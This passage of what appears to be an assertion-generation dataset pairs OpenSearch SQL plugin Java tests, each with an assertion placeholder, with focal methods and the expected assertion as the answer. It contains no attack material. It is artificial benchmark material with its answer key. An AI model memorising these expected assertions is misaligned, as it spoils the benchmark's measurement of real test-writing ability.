getFormat(Map<String, String> requestParams) { String formatName = requestParams.containsKey(QUERY_PARAMS_FORMAT) ? requestParams.get(QUERY_PARAMS_FORMAT).toLowerCase() : DEFAULT_RESPONSE_FORMAT; Optional<Format> optionalFormat = Format.of(formatName); if (optionalFormat.isPresent()) { return optionalFormat.get(); } else { throw new IllegalArgumentException( ""Failed to create executor due to unknown response format: "" + formatName); } }"	assertEquals(Format.JDBC, SqlRequestParam.getFormat(ImmutableMap.of()))
"checkCursorType() { DefaultCursor cursor = new DefaultCursor(); ""<AssertPlaceHolder>""; }
getType() { return type; }"	assertEquals(cursor.getType(), CursorType.DEFAULT)
"cursorShouldStartWithCursorTypeID() { DefaultCursor cursor = new DefaultCursor(); cursor.setRowsLeft(50); cursor.setScrollId(""dbdskbcdjksbcjkdsbcjk+//""); cursor.setIndexPattern(""myIndex""); cursor.setFetchSize(500); cursor.setFieldAliasMap(Collections.emptyMap()); cursor.setColumns(new ArrayList<>()); ""<AssertPlaceHolder>""; }
getType() { return type; }"	"assertThat(cursor.generateCursorId(), startsWith(cursor.getType().getId() + "":""))"
"getIntegerWithDoubleExprValueShouldPass() { ""<AssertPlaceHolder>""; }
doubleValue(Double value) { return new ExprDoubleValue(value); }"	assertThat(ExprValueUtils.getIntegerValue(ExprValueFactory.doubleValue(1d)), equalTo(1))
"increment() { BasicCounter counter = new BasicCounter(); for (int i = 0; i < 5; ++i) { counter.increment(); }  ""<AssertPlaceHolder>""; }
getValue() { return count.longValue(); }"	assertThat(counter.getValue(), equalTo(5L))
"incrementN() { BasicCounter counter = new BasicCounter(); counter.add(5);  ""<AssertPlaceHolder>""; }
getValue() { return count.longValue(); }"	assertThat(counter.getValue(), equalTo(5L))
"registerMetric() { Metrics.getInstance().clear(); Metrics.getInstance().registerMetric(new NumericMetric(""test"", new BasicCounter()));  ""<AssertPlaceHolder>""; }
getAllMetrics() { return new ArrayList<>(registeredMetricsByName.values()); }"	assertThat(Metrics.getInstance().getAllMetrics().size(), equalTo(1))
"getMetric() { Metrics.getInstance().clear(); Metrics.getInstance().registerMetric(new NumericMetric(""test1"", new BasicCounter())); Metric metric = Metrics.getInstance().getMetric(""test1"");  ""<AssertPlaceHolder>""; }
getMetric(String name) { if (name == null) { return null; }  return registeredMetricsByName.get(name); }"	assertThat(metric, notNullValue())
"getAllMetric() { Metrics.getInstance().clear(); Metrics.getInstance().registerMetric(new NumericMetric(""test1"", new BasicCounter())); Metrics.getInstance().registerMetric(new NumericMetric(""test2"", new BasicCounter())); List list = Metrics.getInstance().getAllMetrics();  ""<AssertPlaceHolder>""; }
getAllMetrics() { return new ArrayList<>(registeredMetricsByName.values()); }"	assertThat(list.size(), equalTo(2))
"increment() { NumericMetric metric = new NumericMetric(""test"", new BasicCounter()); for (int i = 0; i < 5; ++i) { metric.increment(); }  ""<AssertPlaceHolder>""; }
getValue() { return counter.getValue(); }"	assertThat(metric.getValue(), equalTo(5L))
"add() { NumericMetric metric = new NumericMetric(""test"", new BasicCounter()); metric.increment(5);  ""<AssertPlaceHolder>""; }
getValue() { return counter.getValue(); }"	assertThat(metric.getValue(), equalTo(5L))
"bucketPath() { BucketPath bucketPath = new BucketPath(); bucketPath.add(metric); bucketPath.add(agg2); bucketPath.add(agg1);  ""<AssertPlaceHolder>""; }
getBucketPath() { String bucketPath = pathStack.isEmpty() ? """" : pathStack.pop().getPath(); return pathStack.stream() .map(path -> path.getSeparator() + path.getPath()) .reduce(bucketPath, String::concat); }"	"assertEquals(""projects@NESTED>projects@FILTERED.c"", bucketPath.getBucketPath())"
"bucketPathEmpty() { BucketPath bucketPath = new BucketPath();  ""<AssertPlaceHolder>""; }
getBucketPath() { String bucketPath = pathStack.isEmpty() ? """" : pathStack.pop().getPath(); return pathStack.stream() .map(path -> path.getSeparator() + path.getPath()) .reduce(bucketPath, String::concat); }"	"assertEquals("""", bucketPath.getBucketPath())"
"josnOutputRequestShouldNotMigrateToQueryPlan() { String sql = ""SELECT age, MAX(balance) FROM account GROUP BY age"";  ""<AssertPlaceHolder>""; }
shouldMigrateToQueryPlan(SQLQueryExpr expr, Format format) { // The JSON format will return the OpenSearch aggregation result, which is not supported by the // QueryPlanner. if (format == Format.JSON) { return false; } QueryPlannerScopeDecider decider = new QueryPlannerScopeDecider(); return decider.isInScope(expr); }"	assertFalse( OpenSearchActionFactory.shouldMigrateToQueryPlan(SqlParserUtils.parse(sql), Format.JSON))
"nestQueryShouldNotMigrateToQueryPlan() { String sql = ""SELECT age, nested(balance) FROM account GROUP BY age"";  ""<AssertPlaceHolder>""; }
shouldMigrateToQueryPlan(SQLQueryExpr expr, Format format) { // The JSON format will return the OpenSearch aggregation result, which is not supported by the // QueryPlanner. if (format == Format.JSON) { return false; } QueryPlannerScopeDecider decider = new QueryPlannerScopeDecider(); return decider.isInScope(expr); }"	assertFalse( OpenSearchActionFactory.shouldMigrateToQueryPlan(SqlParserUtils.parse(sql), Format.JDBC))
"nonAggregationQueryShouldNotMigrateToQueryPlan() { String sql = ""SELECT age FROM account "";  ""<AssertPlaceHolder>""; }
shouldMigrateToQueryPlan(SQLQueryExpr expr, Format format) { // The JSON format will return the OpenSearch aggregation result, which is not supported by the // QueryPlanner. if (format == Format.JSON) { return false; } QueryPlannerScopeDecider decider = new QueryPlannerScopeDecider(); return decider.isInScope(expr); }"	assertFalse( OpenSearchActionFactory.shouldMigrateToQueryPlan(SqlParserUtils.parse(sql), Format.JDBC))
"aggregationQueryWithoutGroupByShouldMigrateToQueryPlan() { String sql = ""SELECT age, COUNT(balance) FROM account "";  ""<AssertPlaceHolder>""; }
shouldMigrateToQueryPlan(SQLQueryExpr expr, Format format) { // The JSON format will return the OpenSearch aggregation result, which is not supported by the // QueryPlanner. if (format == Format.JSON) { return false; } QueryPlannerScopeDecider decider = new QueryPlannerScopeDecider(); return decider.isInScope(expr); }"	assertTrue( OpenSearchActionFactory.shouldMigrateToQueryPlan(SqlParserUtils.parse(sql), Format.JDBC))
"aggregationQueryWithExpressionByShouldMigrateToQueryPlan() { String sql = ""SELECT age, MAX(balance) - MIN(balance) FROM account "";  ""<AssertPlaceHolder>""; }
shouldMigrateToQueryPlan(SQLQueryExpr expr, Format format) { // The JSON format will return the OpenSearch aggregation result, which is not supported by the // QueryPlanner. if (format == Format.JSON) { return false; } QueryPlannerScopeDecider decider = new QueryPlannerScopeDecider(); return decider.isInScope(expr); }"	assertTrue( OpenSearchActionFactory.shouldMigrateToQueryPlan(SqlParserUtils.parse(sql), Format.JDBC))
"queryOnlyHasGroupByShouldMigrateToQueryPlan() { String sql = ""SELECT CAST(age AS DOUBLE) as alias FROM account GROUP BY alias"";  ""<AssertPlaceHolder>""; }
shouldMigrateToQueryPlan(SQLQueryExpr expr, Format format) { // The JSON format will return the OpenSearch aggregation result, which is not supported by the // QueryPlanner. if (format == Format.JSON) { return false; } QueryPlannerScopeDecider decider = new QueryPlannerScopeDecider(); return decider.isInScope(expr); }"	assertTrue( OpenSearchActionFactory.shouldMigrateToQueryPlan(SqlParserUtils.parse(sql), Format.JDBC))
"identifierShouldReturnVarExpression() { context.addGroupKeyExpr(groupG); Expression expression = converter.convert(groupG);  ""<AssertPlaceHolder>""; }
convert(SQLExpr expr) { Optional<Expression> resolvedExpression = context.resolve(expr); if (resolvedExpression.isPresent()) { return resolvedExpression.get(); } else { if (expr instanceof SQLBinaryOpExpr) { return binaryOperatorToExpression((SQLBinaryOpExpr) expr, this::convert); } else if (expr instanceof SQLMethodInvokeExpr) { return methodToExpression((SQLMethodInvokeExpr) expr, this::convert); } else if (expr instanceof SQLValuableExpr) { return literal(ExprValueFactory.from(((SQLValuableExpr) expr).getValue())); } else if (expr instanceof SQLCastExpr) { return cast(convert(((SQLCastExpr) expr).getExpr())); } else { throw new RuntimeException(""unsupported expr: "" + expr); } } }"	"assertEquals(ref(""A"").toString(), expression.toString())"
"functionOverCompoundBinaryOperatorShouldReturnCorrectExpression() { context.addAggregationExpr(maxA); context.addAggregationExpr(minA);  SQLMethodInvokeExpr methodInvokeExpr = new SQLMethodInvokeExpr(""LOG""); methodInvokeExpr.addParameter( new SQLBinaryOpExpr( maxA, SQLBinaryOperator.Add, new SQLBinaryOpExpr(maxA, SQLBinaryOperator.Add, minA)));  Expression expression = converter.convert(methodInvokeExpr); ""<AssertPlaceHolder>""; }
convert(SQLExpr expr) { Optional<Expression> resolvedExpression = context.resolve(expr); if (resolvedExpression.isPresent()) { return resolvedExpression.get(); } else { if (expr instanceof SQLBinaryOpExpr) { return binaryOperatorToExpression((SQLBinaryOpExpr) expr, this::convert); } else if (expr instanceof SQLMethodInvokeExpr) { return methodToExpression((SQLMethodInvokeExpr) expr, this::convert); } else if (expr instanceof SQLValuableExpr) { return literal(ExprValueFactory.from(((SQLValuableExpr) expr).getValue())); } else if (expr instanceof SQLCastExpr) { return cast(convert(((SQLCastExpr) expr).getExpr())); } else { throw new RuntimeException(""unsupported expr: "" + expr); } } }"	"assertEquals( log(add(ref(""MAX_0""), add(ref(""MAX_0""), ref(""MIN_1"")))).toString(), expression.toString())"
"functionOverGroupColumn() { context.addAggregationExpr(maxA); context.addAggregationExpr(minA);  SQLMethodInvokeExpr methodInvokeExpr = new SQLMethodInvokeExpr(""LOG""); methodInvokeExpr.addParameter( new SQLBinaryOpExpr( maxA, SQLBinaryOperator.Add, new SQLBinaryOpExpr(maxA, SQLBinaryOperator.Add, minA)));  Expression expression = converter.convert(methodInvokeExpr); ""<AssertPlaceHolder>""; }
convert(SQLExpr expr) { Optional<Expression> resolvedExpression = context.resolve(expr); if (resolvedExpression.isPresent()) { return resolvedExpression.get(); } else { if (expr instanceof SQLBinaryOpExpr) { return binaryOperatorToExpression((SQLBinaryOpExpr) expr, this::convert); } else if (expr instanceof SQLMethodInvokeExpr) { return methodToExpression((SQLMethodInvokeExpr) expr, this::convert); } else if (expr instanceof SQLValuableExpr) { return literal(ExprValueFactory.from(((SQLValuableExpr) expr).getValue())); } else if (expr instanceof SQLCastExpr) { return cast(convert(((SQLCastExpr) expr).getExpr())); } else { throw new RuntimeException(""unsupported expr: "" + expr); } } }"	"assertEquals( log(add(ref(""MAX_0""), add(ref(""MAX_0""), ref(""MIN_1"")))).toString(), expression.toString())"
"noBucketOneMetricShouldPass() { String json = ""{\n  ""max#max"": {\n    ""value"": 40\n  }\n}""; List<Map<String, Object>> result = SearchAggregationResponseHelper.flatten(AggregationUtils.fromJson(json)); ""<AssertPlaceHolder>""; }
flatten(Aggregations aggregations) { List<Aggregation> aggregationList = aggregations.asList(); List<Map<String, Object>> resultList = new ArrayList<>(); Map<String, Object> resultMap = new HashMap<>(); for (Aggregation aggregation : aggregationList) { if (aggregation instanceof Terms) { for (Terms.Bucket bucket : ((Terms) aggregation).getBuckets()) { List<Map<String, Object>> internalBucketList = flatten(bucket.getAggregations()); fillResultListWithInternalBucket( resultList, internalBucketList, aggregation.getName(), bucket.getKey()); } } else if (aggregation instanceof NumericMetricsAggregation.SingleValue) { resultMap.put( aggregation.getName(), ((NumericMetricsAggregation.SingleValue) aggregation).value()); } else if (aggregation instanceof Percentiles) { Percentiles percentiles = (Percentiles) aggregation; resultMap.putAll( (Map<String, Double>) StreamSupport.stream(percentiles.spliterator(), false) .collect( Collectors.toMap( (percentile) -> String.format( ""%s_%s"", percentiles.getName(), percentile.getPercent()), Percentile::getValue, (v1, v2) -> { throw new IllegalArgumentException( String.format(""Duplicate key for values %s and %s"", v1, v2)); }, HashMap::new))); } else if (aggregation instanceof Histogram) { for (Histogram.Bucket bucket : ((Histogram) aggregation).getBuckets()) { List<Map<String, Object>> internalBucketList = flatten(bucket.getAggregations()); fillResultListWithInternalBucket( resultList, internalBucketList, aggregation.getName(), bucket.getKeyAsString()); } } else { throw new RuntimeException(""unsupported aggregation type "" + aggregation.getType()); } } if (!resultMap.isEmpty()) { resultList.add(resultMap); } return resultList; }"	"assertThat(result, contains(allOf(hasEntry(""max"", 40d))))"
"noBucketMultipleMetricShouldPass() { String json = ""{\n"" + ""  ""max#max"": {\n"" + ""    ""value"": 40\n"" + ""  },\n"" + ""  ""min#min"": {\n"" + ""    ""value"": 20\n"" + ""  }\n"" + ""}""; List<Map<String, Object>> result = SearchAggregationResponseHelper.flatten(AggregationUtils.fromJson(json)); ""<AssertPlaceHolder>""; }
flatten(Aggregations aggregations) { List<Aggregation> aggregationList = aggregations.asList(); List<Map<String, Object>> resultList = new ArrayList<>(); Map<String, Object> resultMap = new HashMap<>(); for (Aggregation aggregation : aggregationList) { if (aggregation instanceof Terms) { for (Terms.Bucket bucket : ((Terms) aggregation).getBuckets()) { List<Map<String, Object>> internalBucketList = flatten(bucket.getAggregations()); fillResultListWithInternalBucket( resultList, internalBucketList, aggregation.getName(), bucket.getKey()); } } else if (aggregation instanceof NumericMetricsAggregation.SingleValue) { resultMap.put( aggregation.getName(), ((NumericMetricsAggregation.SingleValue) aggregation).value()); } else if (aggregation instanceof Percentiles) { Percentiles percentiles = (Percentiles) aggregation; resultMap.putAll( (Map<String, Double>) StreamSupport.stream(percentiles.spliterator(), false) .collect( Collectors.toMap( (percentile) -> String.format( ""%s_%s"", percentiles.getName(), percentile.getPercent()), Percentile::getValue, (v1, v2) -> { throw new IllegalArgumentException( String.format(""Duplicate key for values %s and %s"", v1, v2)); }, HashMap::new))); } else if (aggregation instanceof Histogram) { for (Histogram.Bucket bucket : ((Histogram) aggregation).getBuckets()) { List<Map<String, Object>> internalBucketList = flatten(bucket.getAggregations()); fillResultListWithInternalBucket( resultList, internalBucketList, aggregation.getName(), bucket.getKeyAsString()); } } else { throw new RuntimeException(""unsupported aggregation type "" + aggregation.getType()); } } if (!resultMap.isEmpty()) { resultList.add(resultMap); } return resultList; }"	"assertThat(result, contains(allOf(hasEntry(""max"", 40d), hasEntry(""min"", 20d))))"
"oneBucketMultipleMetricShouldPass() { String json = ""{\n"" + ""  ""sterms#gender"": {\n"" + ""    ""buckets"": [\n"" + ""      {\n"" + ""        ""key"": ""m"",\n"" + ""        ""doc_count"": 507,\n"" + ""        ""min#min"": {\n"" + ""          ""value"": 10\n"" + ""        },\n"" + ""        ""max#max"": {\n"" + ""          ""value"": 20\n"" + ""        }\n"" + ""      },\n"" + ""      {\n"" + ""        ""key"": ""f"",\n"" + ""        ""doc_count"": 493,\n"" + ""        ""min#min"": {\n"" + ""          ""value"": 20\n"" + ""        },\n"" + ""        ""max#max"": {\n"" + ""          ""value"": 40\n"" + ""        }\n"" + ""      }\n"" + ""    ]\n"" + ""  }\n"" + ""}""; List<Map<String, Object>> result = SearchAggregationResponseHelper.flatten(AggregationUtils.fromJson(json)); ""<AssertPlaceHolder>""; }
flatten(Aggregations aggregations) { List<Aggregation> aggregationList = aggregations.asList(); List<Map<String, Object>> resultList = new ArrayList<>(); Map<String, Object> resultMap = new HashMap<>(); for (Aggregation aggregation : aggregationList) { if (aggregation instanceof Terms) { for (Terms.Bucket bucket : ((Terms) aggregation).getBuckets()) { List<Map<String, Object>> internalBucketList = flatten(bucket.getAggregations()); fillResultListWithInternalBucket( resultList, internalBucketList, aggregation.getName(), bucket.getKey()); } } else if (aggregation instanceof NumericMetricsAggregation.SingleValue) { resultMap.put( aggregation.getName(), ((NumericMetricsAggregation.SingleValue) aggregation).value()); } else if (aggregation instanceof Percentiles) { Percentiles percentiles = (Percentiles) aggregation; resultMap.putAll( (Map<String, Double>) StreamSupport.stream(percentiles.spliterator(), false) .collect( Collectors.toMap( (percentile) -> String.format( ""%s_%s"", percentiles.getName(), percentile.getPercent()), Percentile::getValue, (v1, v2) -> { throw new IllegalArgumentException( String.format(""Duplicate key for values %s and %s"", v1, v2)); }, HashMap::new))); } else if (aggregation instanceof Histogram) { for (Histogram.Bucket bucket : ((Histogram) aggregation).getBuckets()) { List<Map<String, Object>> internalBucketList = flatten(bucket.getAggregations()); fillResultListWithInternalBucket( resultList, internalBucketList, aggregation.getName(), bucket.getKeyAsString()); } } else { throw new RuntimeException(""unsupported aggregation type "" + aggregation.getType()); } } if (!resultMap.isEmpty()) { resultList.add(resultMap); } return resultList; }"	"assertThat( result, contains( allOf(hasEntry(""gender"", (Object) ""m""), hasEntry(""min"", 10d), hasEntry(""max"", 20d)), allOf(hasEntry(""gender"", (Object) ""f""), hasEntry(""min"", 20d), hasEntry(""max"", 40d))))"
"multipleBucketMultipleMetricShouldPass() { String json = ""{\n"" + ""  ""sterms#gender"": {\n"" + ""    ""buckets"": [\n"" + ""      {\n"" + ""        ""key"": ""m"",\n"" + ""        ""sterms#state"": {\n"" + ""          ""buckets"": [\n"" + ""            {\n"" + ""              ""key"": ""MD"",\n"" + ""              ""min#min"": {\n"" + ""                ""value"": 22\n"" + ""              },\n"" + ""              ""max#max"": {\n"" + ""                ""value"": 39\n"" + ""              }\n"" + ""            },\n"" + ""            {\n"" + ""              ""key"": ""ID"",\n"" + ""              ""min#min"": {\n"" + ""                ""value"": 23\n"" + ""              },\n"" + ""              ""max#max"": {\n"" + ""                ""value"": 40\n"" + ""              }\n"" + ""            }\n"" + ""          ]\n"" + ""        }\n"" + ""      },\n"" + ""      {\n"" + ""        ""key"": ""f"",\n"" + ""        ""sterms#state"": {\n"" + ""          ""buckets"": [\n"" + ""            {\n"" + ""              ""key"": ""TX"",\n"" + ""              ""min#min"": {\n"" + ""                ""value"": 20\n"" + ""              },\n"" + ""              ""max#max"": {\n"" + ""                ""value"": 38\n"" + ""              }\n"" + ""            },\n"" + ""            {\n"" + ""              ""key"": ""MI"",\n"" + ""              ""min#min"": {\n"" + ""                ""value"": 22\n"" + ""              },\n"" + ""              ""max#max"": {\n"" + ""                ""value"": 40\n"" + ""              }\n"" + ""            }\n"" + ""          ]\n"" + ""        }\n"" + ""      }\n"" + ""    ]\n"" + ""  }\n"" + ""}""; List<Map<String, Object>> result = SearchAggregationResponseHelper.flatten(AggregationUtils.fromJson(json)); ""<AssertPlaceHolder>""; }
flatten(Aggregations aggregations) { List<Aggregation> aggregationList = aggregations.asList(); List<Map<String, Object>> resultList = new ArrayList<>(); Map<String, Object> resultMap = new HashMap<>(); for (Aggregation aggregation : aggregationList) { if (aggregation instanceof Terms) { for (Terms.Bucket bucket : ((Terms) aggregation).getBuckets()) { List<Map<String, Object>> internalBucketList = flatten(bucket.getAggregations()); fillResultListWithInternalBucket( resultList, internalBucketList, aggregation.getName(), bucket.getKey()); } } else if (aggregation instanceof NumericMetricsAggregation.SingleValue) { resultMap.put( aggregation.getName(), ((NumericMetricsAggregation.SingleValue) aggregation).value()); } else if (aggregation instanceof Percentiles) { Percentiles percentiles = (Percentiles) aggregation; resultMap.putAll( (Map<String, Double>) StreamSupport.stream(percentiles.spliterator(), false) .collect( Collectors.toMap( (percentile) -> String.format( ""%s_%s"", percentiles.getName(), percentile.getPercent()), Percentile::getValue, (v1, v2) -> { throw new IllegalArgumentException( String.format(""Duplicate key for values %s and %s"", v1, v2)); }, HashMap::new))); } else if (aggregation instanceof Histogram) { for (Histogram.Bucket bucket : ((Histogram) aggregation).getBuckets()) { List<Map<String, Object>> internalBucketList = flatten(bucket.getAggregations()); fillResultListWithInternalBucket( resultList, internalBucketList, aggregation.getName(), bucket.getKeyAsString()); } } else { throw new RuntimeException(""unsupported aggregation type "" + aggregation.getType()); } } if (!resultMap.isEmpty()) { resultList.add(resultMap); } return resultList; }"	"assertThat( result, contains( allOf( hasEntry(""gender"", (Object) ""m""), hasEntry(""state"", (Object) ""MD""), hasEntry(""min"", 22d), hasEntry(""max"", 39d)), allOf( hasEntry(""gender"", (Object) ""m""), hasEntry(""state"", (Object) ""ID""), hasEntry(""min"", 23d), hasEntry(""max"", 40d)), allOf( hasEntry(""gender"", (Object) ""f""), hasEntry(""state"", (Object) ""TX""), hasEntry(""min"", 20d), hasEntry(""max"", 38d)), allOf( hasEntry(""gender"", (Object) ""f""), hasEntry(""state"", (Object) ""MI""), hasEntry(""min"", 22d), hasEntry(""max"", 40d))))"
"multipleBucketWithoutMetricShouldPass() { String json = ""{\n"" + ""  ""lterms#age"": {\n"" + ""    ""buckets"": [\n"" + ""      {\n"" + ""        ""key"": 31,\n"" + ""        ""doc_count"": 61,\n"" + ""        ""sterms#gender"": {\n"" + ""          ""buckets"": [\n"" + ""            {\n"" + ""              ""key"": ""m"",\n"" + ""              ""doc_count"": 35\n"" + ""            },\n"" + ""            {\n"" + ""              ""key"": ""f"",\n"" + ""              ""doc_count"": 26\n"" + ""            }\n"" + ""          ]\n"" + ""        }\n"" + ""      },\n"" + ""      {\n"" + ""        ""key"": 39,\n"" + ""        ""doc_count"": 60,\n"" + ""        ""sterms#gender"": {\n"" + ""          ""buckets"": [\n"" + ""            {\n"" + ""              ""key"": ""f"",\n"" + ""              ""doc_count"": 38\n"" + ""            },\n"" + ""            {\n"" + ""              ""key"": ""m"",\n"" + ""              ""doc_count"": 22\n"" + ""            }\n"" + ""          ]\n"" + ""        }\n"" + ""      }\n"" + ""    ]\n"" + ""  }\n"" + ""}""; List<Map<String, Object>> result = SearchAggregationResponseHelper.flatten(AggregationUtils.fromJson(json)); ""<AssertPlaceHolder>""; }
flatten(Aggregations aggregations) { List<Aggregation> aggregationList = aggregations.asList(); List<Map<String, Object>> resultList = new ArrayList<>(); Map<String, Object> resultMap = new HashMap<>(); for (Aggregation aggregation : aggregationList) { if (aggregation instanceof Terms) { for (Terms.Bucket bucket : ((Terms) aggregation).getBuckets()) { List<Map<String, Object>> internalBucketList = flatten(bucket.getAggregations()); fillResultListWithInternalBucket( resultList, internalBucketList, aggregation.getName(), bucket.getKey()); } } else if (aggregation instanceof NumericMetricsAggregation.SingleValue) { resultMap.put( aggregation.getName(), ((NumericMetricsAggregation.SingleValue) aggregation).value()); } else if (aggregation instanceof Percentiles) { Percentiles percentiles = (Percentiles) aggregation; resultMap.putAll( (Map<String, Double>) StreamSupport.stream(percentiles.spliterator(), false) .collect( Collectors.toMap( (percentile) -> String.format( ""%s_%s"", percentiles.getName(), percentile.getPercent()), Percentile::getValue, (v1, v2) -> { throw new IllegalArgumentException( String.format(""Duplicate key for values %s and %s"", v1, v2)); }, HashMap::new))); } else if (aggregation instanceof Histogram) { for (Histogram.Bucket bucket : ((Histogram) aggregation).getBuckets()) { List<Map<String, Object>> internalBucketList = flatten(bucket.getAggregations()); fillResultListWithInternalBucket( resultList, internalBucketList, aggregation.getName(), bucket.getKeyAsString()); } } else { throw new RuntimeException(""unsupported aggregation type "" + aggregation.getType()); } } if (!resultMap.isEmpty()) { resultList.add(resultMap); } return resultList; }"	"assertThat( result, containsInAnyOrder( allOf(hasEntry(""age"", (Object) 31L), hasEntry(""gender"", ""m"")), allOf(hasEntry(""age"", (Object) 31L), hasEntry(""gender"", ""f"")), allOf(hasEntry(""age"", (Object) 39L), hasEntry(""gender"", ""m"")), allOf(hasEntry(""age"", (Object) 39L), hasEntry(""gender"", ""f""))))"
"noBucketPercentilesShouldPass() { String json = ""{\n"" + ""  ""percentiles_bucket#age"": {\n"" + ""    ""values"": {\n"" + ""      ""1.0"": 20,\n"" + ""      ""5.0"": 21,\n"" + ""      ""25.0"": 25,\n"" + ""      ""50.0"": 30.90909090909091,\n"" + ""      ""75.0"": 35,\n"" + ""      ""95.0"": 39,\n"" + ""      ""99.0"": 40\n"" + ""    }\n"" + ""  }\n"" + ""}""; List<Map<String, Object>> result = SearchAggregationResponseHelper.flatten(AggregationUtils.fromJson(json)); ""<AssertPlaceHolder>""; }
flatten(Aggregations aggregations) { List<Aggregation> aggregationList = aggregations.asList(); List<Map<String, Object>> resultList = new ArrayList<>(); Map<String, Object> resultMap = new HashMap<>(); for (Aggregation aggregation : aggregationList) { if (aggregation instanceof Terms) { for (Terms.Bucket bucket : ((Terms) aggregation).getBuckets()) { List<Map<String, Object>> internalBucketList = flatten(bucket.getAggregations()); fillResultListWithInternalBucket( resultList, internalBucketList, aggregation.getName(), bucket.getKey()); } } else if (aggregation instanceof NumericMetricsAggregation.SingleValue) { resultMap.put( aggregation.getName(), ((NumericMetricsAggregation.SingleValue) aggregation).value()); } else if (aggregation instanceof Percentiles) { Percentiles percentiles = (Percentiles) aggregation; resultMap.putAll( (Map<String, Double>) StreamSupport.stream(percentiles.spliterator(), false) .collect( Collectors.toMap( (percentile) -> String.format( ""%s_%s"", percentiles.getName(), percentile.getPercent()), Percentile::getValue, (v1, v2) -> { throw new IllegalArgumentException( String.format(""Duplicate key for values %s and %s"", v1, v2)); }, HashMap::new))); } else if (aggregation instanceof Histogram) { for (Histogram.Bucket bucket : ((Histogram) aggregation).getBuckets()) { List<Map<String, Object>> internalBucketList = flatten(bucket.getAggregations()); fillResultListWithInternalBucket( resultList, internalBucketList, aggregation.getName(), bucket.getKeyAsString()); } } else { throw new RuntimeException(""unsupported aggregation type "" + aggregation.getType()); } } if (!resultMap.isEmpty()) { resultList.add(resultMap); } return resultList; }"	"assertThat(result, contains(allOf(hasEntry(""age_1.0"", 20d))))"
"populateShouldPass() { String json = ""{\n"" + ""  ""date_histogram#days"": {\n"" + ""    ""buckets"": [\n"" + ""      {\n"" + ""        ""key_as_string"": ""2014-08-14 00:00:00"",\n"" + ""        ""key"": 1407974400000,\n"" + ""        ""doc_count"": 477,\n"" + ""        ""value_count#COUNT_0"": {\n"" + ""          ""value"": 477\n"" + ""        }\n"" + ""      }\n"" + ""    ]\n"" + ""  }\n"" + ""}""; List<Map<String, Object>> result = SearchAggregationResponseHelper.flatten(AggregationUtils.fromJson(json)); ""<AssertPlaceHolder>""; }
flatten(Aggregations aggregations) { List<Aggregation> aggregationList = aggregations.asList(); List<Map<String, Object>> resultList = new ArrayList<>(); Map<String, Object> resultMap = new HashMap<>(); for (Aggregation aggregation : aggregationList) { if (aggregation instanceof Terms) { for (Terms.Bucket bucket : ((Terms) aggregation).getBuckets()) { List<Map<String, Object>> internalBucketList = flatten(bucket.getAggregations()); fillResultListWithInternalBucket( resultList, internalBucketList, aggregation.getName(), bucket.getKey()); } } else if (aggregation instanceof NumericMetricsAggregation.SingleValue) { resultMap.put( aggregation.getName(), ((NumericMetricsAggregation.SingleValue) aggregation).value()); } else if (aggregation instanceof Percentiles) { Percentiles percentiles = (Percentiles) aggregation; resultMap.putAll( (Map<String, Double>) StreamSupport.stream(percentiles.spliterator(), false) .collect( Collectors.toMap( (percentile) -> String.format( ""%s_%s"", percentiles.getName(), percentile.getPercent()), Percentile::getValue, (v1, v2) -> { throw new IllegalArgumentException( String.format(""Duplicate key for values %s and %s"", v1, v2)); }, HashMap::new))); } else if (aggregation instanceof Histogram) { for (Histogram.Bucket bucket : ((Histogram) aggregation).getBuckets()) { List<Map<String, Object>> internalBucketList = flatten(bucket.getAggregations()); fillResultListWithInternalBucket( resultList, internalBucketList, aggregation.getName(), bucket.getKeyAsString()); } } else { throw new RuntimeException(""unsupported aggregation type "" + aggregation.getType()); } } if (!resultMap.isEmpty()) { resultList.add(resultMap); } return resultList; }"	"assertThat( result, containsInAnyOrder( allOf(hasEntry(""days"", (Object) ""2014-08-14 00:00:00""), hasEntry(""COUNT_0"", 477d))))"
"match() { ""<AssertPlaceHolder>""; }
match(SQLQueryExpr expr) { return true; }"	assertTrue(rule.match(queryExpr))
"SQLFeatureNotSupportedException { String sql = ""SELECT * FROM A WHERE a IN (SELECT b FROM B)""; ""<AssertPlaceHolder>""; }
match(SQLQueryExpr expr) throws SQLFeatureNotSupportedException { expr.accept(findAllSubQuery);  if (isContainSubQuery(findAllSubQuery)) { if (isSupportedSubQuery(findAllSubQuery)) { return true; } else { throw new SQLFeatureNotSupportedException( ""Unsupported subquery. Only one EXISTS or IN is supported""); } } else { return false; } }"	assertTrue(rewriteRule.match(SqlParserUtils.parse(sql)))
"SQLFeatureNotSupportedException { String sql = ""SELECT * FROM A WHERE a NOT IN (SELECT b FROM B)""; ""<AssertPlaceHolder>""; }
match(SQLQueryExpr expr) throws SQLFeatureNotSupportedException { expr.accept(findAllSubQuery);  if (isContainSubQuery(findAllSubQuery)) { if (isSupportedSubQuery(findAllSubQuery)) { return true; } else { throw new SQLFeatureNotSupportedException( ""Unsupported subquery. Only one EXISTS or IN is supported""); } } else { return false; } }"	assertTrue(rewriteRule.match(SqlParserUtils.parse(sql)))
"SQLFeatureNotSupportedException { String sql = ""SELECT * FROM A WHERE EXISTS (SELECT 1 FROM B WHERE A.a_v = B.b_v)""; ""<AssertPlaceHolder>""; }
match(SQLQueryExpr expr) throws SQLFeatureNotSupportedException { expr.accept(findAllSubQuery);  if (isContainSubQuery(findAllSubQuery)) { if (isSupportedSubQuery(findAllSubQuery)) { return true; } else { throw new SQLFeatureNotSupportedException( ""Unsupported subquery. Only one EXISTS or IN is supported""); } } else { return false; } }"	assertTrue(rewriteRule.match(SqlParserUtils.parse(sql)))
"SQLFeatureNotSupportedException { String sql = ""SELECT * "" + ""FROM A WHERE NOT EXISTS (SELECT 1 FROM B WHERE A.a_v = B.b_v)""; ""<AssertPlaceHolder>""; }
match(SQLQueryExpr expr) throws SQLFeatureNotSupportedException { expr.accept(findAllSubQuery);  if (isContainSubQuery(findAllSubQuery)) { if (isSupportedSubQuery(findAllSubQuery)) { return true; } else { throw new SQLFeatureNotSupportedException( ""Unsupported subquery. Only one EXISTS or IN is supported""); } } else { return false; } }"	assertTrue(rewriteRule.match(SqlParserUtils.parse(sql)))
"SQLFeatureNotSupportedException { String sql = ""SELECT A.v as v, (SELECT MAX(b) FROM B WHERE A.id = B.id) as max_age FROM A""; ""<AssertPlaceHolder>""; }
